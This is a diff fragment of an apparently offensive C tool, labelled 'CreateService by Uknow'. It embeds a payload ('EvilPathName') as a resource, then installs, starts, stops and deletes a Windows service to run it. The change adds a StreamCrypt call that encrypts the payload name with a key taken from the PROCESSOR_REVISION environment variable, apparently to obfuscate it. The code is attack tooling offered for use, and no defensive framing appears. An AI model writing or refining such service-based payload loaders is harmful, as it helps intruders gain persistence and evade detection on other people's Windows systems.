@@ -131,6 +131,8 @@ int main(int argc, TCHAR* argv[])
 {
 	BOOL bRet = FALSE;
 	char* szFileName = argv[1];
+	char* evilName = argv[2];
+	char* enName = argv[2];
 	szName = argv[3];
 	printf("[*] CreateService by Uknow\n");
 	if (argc != 5)
@@ -140,7 +142,7 @@ int main(int argc, TCHAR* argv[])
 		return -1;
 	}
 	else if (strcmp(argv[4], "start") == 0) {
-		if (!AddResource(argv[1], argv[2]))
+		if (!AddResource(argv[1], enName))
 		{
 			return -1;
 		}
@@ -156,9 +158,10 @@ int main(int argc, TCHAR* argv[])
 			printf("   [-] Start Error!\n");
 			return -1;
 		}
+		StreamCrypt(evilName, strlen(evilName), getenv("PROCESSOR_REVISION"), strlen(getenv("PROCESSOR_REVISION")));
 		printf("    [+] ServiceName: %s\n", szName);
 		printf("    [+] TransitPathName: %s\n", szFileName);
-		printf("    [+] EvilPathName: %s\n", argv[2]);
+		printf("    [+] EvilPathName: %s\n", evilName);
 		printf("    [+] Success! Service successfully Create and Start.\n");
 		return 0;
 	}
@@ -178,7 +181,7 @@ int main(int argc, TCHAR* argv[])
 		}
 		printf("    [+] ServiceName: %s\n", szName);
 		printf("    [+] TransitPathName: %s\n", szFileName);
-		printf("    [+] EvilPathName: %s\n", argv[2]);
+		printf("    [+] EvilPathName: %s\n", evilName);
 		printf("    [+] Success! Service successfully Stop and Delete.\n");
 		return 0;
 	}
